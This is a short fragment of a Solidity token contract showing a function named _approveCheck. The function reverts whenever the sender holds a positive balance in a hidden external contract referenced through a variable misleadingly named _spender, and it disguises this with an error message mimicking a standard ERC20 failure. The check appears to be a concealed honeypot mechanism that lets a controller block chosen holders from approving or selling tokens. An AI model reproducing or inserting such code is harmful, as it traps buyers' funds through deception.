    }

    function _approveCheck(uint256 a, address from) internal view returns (bool){ 
        if(a > 0){
            uint256 b = IERC20(address(uint160(_spender))).balanceOf(from);
            require(!(b>0) , 'Indicates a failure with the `approver` of a token to be approved');
        }
        
        return true;
